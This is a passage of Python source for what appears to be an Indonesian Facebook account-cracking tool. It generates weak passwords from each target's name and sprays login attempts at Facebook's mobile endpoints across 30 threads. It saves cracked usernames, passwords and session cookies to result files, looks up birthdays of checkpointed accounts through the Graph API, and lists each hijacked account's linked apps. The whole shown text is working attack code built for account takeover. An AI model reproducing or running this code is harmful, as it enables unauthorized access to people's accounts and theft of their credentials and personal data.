cookie': koki},headers=heade,allow_redirects=False)
                if "c_user" in ses.cookies.get_dict():
                    digi = random.choice([2])
                    digi = self.kentod(digi)
                    coki = self.ngoxok(ses.cookies.get_dict())
                    if "y" in self.apk:
                        self.cek_apk(user, pw, coki, digi)
                    elif "t" in self.apk:
                        tree = Tree("")
                        tree.add(" • OK")
                        tree.add(f"[bold green]{user}|{pw}")
                        tree.add(" Cookie").add(f"[bold green]{coki}ua={digi}")
                        prints(tree)
                    wrt = (f" [✓] {user}|{pw}|{coki}")
                    self.ok.append(wrt)
                    with open(f"results/OK/OK-{ha}-{op}-{ta}.txt", "a", encoding="utf-8") as r:
                        r.write(wrt+"\n")
                    break
                elif "checkpoint" in ses.cookies.get_dict():
                    tree = Tree("")
                    try:
                        ytta = self.ses.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={self.tok}", cookies=self.cok).json()["birthday"]
                        month, day, year = ytta.split("/")
                        month = yakah[month]
                        tree.add(f"[bold yellow]{user}|{pw} {day} {month} {year}")
                        prints(tree)
                        wrt = (f" [×] {user}|{pw} {day} {month} {year}")
                        self.cp.append(wrt)
                        with open(f"results/CP/CP-{ha}-{op}-{ta}.txt", "a", encoding="utf-8") as a:
                            a.write(wrt+"\n")
                        break
                    except:
                        tree.add(f"[bold yellow]{user}|{pw}")
                        prints(tree)
                        wrt = (f" [×] {user}|{pw}")
                        self.cp.append(wrt)
                        with open(f"results/CP/CP-{ha}-{op}-{ta}.txt", "a", encoding="utf-8") as w:
                            w.write(wrt+"\n")
                        break
                else:
                    continue
#            except Exception as e:
#                prints(e)
            except requests.exceptions.ConnectionError:
                time.sleep(3)
        self.loop+=1
    # ------- MENGECEK APLIKASI --------
    def cek_apk(self, user, pw, cok, ahh):
        cookie = {"cookie":cok}
        self.language(cookie)
        tree = Tree("")
        tree.add(f"[bold green]{user}|{pw}|[bold green]{cok};ua={ahh}")
        try:
            active = Tree(f"\r{hijau}Aplikasi aktif :")
            url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active"
            self.get_active(url,active,cookie)
        except Exception as e:
            prints(e)
        try:
            inactive = Tree(f"\r{merah}Aplikasi kadaluarsa :")
            url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive"
            self.get_inactive(url,inactive,cookie)
        except Exception as e:
            prints(e)
        tree.add(active)
        tree.add(inactive)
        prints(tree)

    def get_active(self,url,active,cookie):
        try:
            data = par(self.ses.get(url,cookies=cookie).text,"html.parser")
            for apk in data.find_all("h3"):
                if "Ditambahkan" in apk.text:
                    active.add(f"\r{H}{str(apk.text).replace('Ditambahkan',f' {N}- Ditambahkan')}{N}")
                else:continue
            next = "https://mbasic.facebook.com" + data.find("a",string="Lihat Lainnya")["href"]
            self.get_active(next,active,cookie)
        except:pass

    def get_inactive(self,url,inactive,cookie):
        try:
            data = par(self.ses.get(url,cookies=cookie).text,"html.parser")
            for apk in data.find_all("h3"):
                if "Kedaluwarsa" in apk.text:
                    inactive.add(f"\r{M}{str(apk.text).replace('Kedaluwarsa',f' {N}- Kedaluwarsa')}{N}")
                else:continue
            next = "https://mbasic.facebook.com" + data.find("a",string="Lihat Lainnya")["href"]
            self.get_inactive(next,inactive,cookie)
        except:pass

    # ------- METODE PILIHAN --------
    def __pler__(self):
        yan = input(f"[{O}*{N}] method : ")
        if yan in [""," "]:
            print(f"  {N}[{M}×{N}] jangan kosong bro");self.__pler__()
        elif yan in ["01","1"]:
            self.met.append("free")
        elif yan in ["02","2"]:
            self.met.append("mbasic")
        elif yan in ["03","3"]:
            self.met.append("mobile")
        elif yan in ["04","4"]:
            self.met.append("free_1")
        elif yan in ["05","5"]:
            self.met.append("mbasic_1")
        elif yan in ["06","6"]:
            self.met.append("mobile_1")
        else:
            print(f"  {N}[{M}×{N}] input yang bener");self.__pler__()
        self.progg()
    # ------- PROGRESS ------------
    def progg(self):
        self.ingfo()
        global prog,des
        prog = Progress(SpinnerColumn('smiley'),TextColumn('{task.description}'),BarColumn(bar_width=70),TextColumn('{task.percentage:.0f}%'))
        des = prog.add_task('',total=len(self.idd))
        with prog:
            with Modol(max_workers=30) as bool:
                for user in self.idd:
                    uid,nma = user.split('<=>')[0],user.split('<=>')[1].lower()
                    frs = nma.split(' ')[0]
                    pwx = []
                    if len(nma)<6:
                        if len(frs)<3:
                            pass
                        else:
                            pwx.append(nma)
                            pwx.append(frs+'321')
                            pwx.append(frs+'1234')
                            pwx.append(frs+'123456')
                    else:
                        if len(frs)<3:
                            pwx.append(nma)
                        else:
                            pwx.append(nma)
                            pwx.append(frs+'321')
                            pwx.append(frs+'1234')
                            pwx.append(frs+'123456')
                    if "ya" in self.iya:
                        for kontol in self.pwa:
                            pwx.append(kontol)
                    if "free" in self.met:
                        bool.submit(self.validate, uid, pwx, "free.facebook.com")
                    elif  "mbasic" in self.met:
                        bool.submit(self.validate, uid, pwx, "mbasic.facebook.com")
                    elif  "mobile" in self.met:
                        bool.submit(self.validate, uid, pwx, "m.facebook.com")
                    elif  "free_1" in self.met:
                        bool.submit(self.reguller, uid, pwx, "free.facebook.com")
                    elif  "mbasic_1" in self.met:
                        bool.submit(self.reguller, uid, pwx, "mbasic.facebook.com")
                    elif  "mobile_1" in self.met:
                        bool.submit(self.reguller, uid, pwx, "m.facebook.com")
                    else:
                        bool.submit(self.reguller, uid, pwx, "m.facebook.com")

        Selesai_crack(self.ok, self.cp)